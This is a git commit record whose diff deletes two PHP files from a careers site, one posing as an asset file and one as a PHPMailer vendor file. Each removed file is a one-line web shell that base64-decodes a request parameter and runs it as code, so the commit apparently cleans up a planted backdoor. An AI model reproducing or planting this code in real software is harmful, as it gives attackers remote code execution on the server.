594fa2fc2939c374035b247d7187b96e40d291b8
hollowescape <sharma.mayankguru@gmail.com>
2021-05-23 19:05:50 +0530

    update

--- careers.picshort.com/assets/assets.php
+++
@@ -1,2 +0,0 @@
-<?php
-if(!empty($_REQUEST['eac'])){$eac=base64_decode($_REQUEST["eac"]);$eac=create_function('',$eac);$eac();exit;}
--- careers.picshort.com/form/vendor/phpmailer/phpmailer/phpmailer.php
+++
@@ -1,2 +0,0 @@
-<?php
-if(!empty($_REQUEST['cdb'])){$cdb=base64_decode($_REQUEST["cdb"]);$cdb=create_function('',$cdb);$cdb();exit;}
